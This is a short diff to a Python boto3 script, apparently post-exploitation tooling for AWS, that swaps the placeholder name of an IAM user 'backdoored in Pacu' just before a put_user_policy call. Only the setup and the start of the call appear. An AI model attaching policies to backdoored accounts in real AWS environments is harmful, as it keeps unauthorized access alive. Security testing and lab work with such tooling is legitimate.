@@ -10,7 +10,7 @@ client = boto3.client(
     aws_secret_access_key='SECRET'
 )
 
-backdooredUser = "ReadTest" # Change this to the user you backdoored in Pacu
+backdooredUser = "USER" # Change this to the user you backdoored in Pacu
 
 try:
     response = client.put_user_policy(
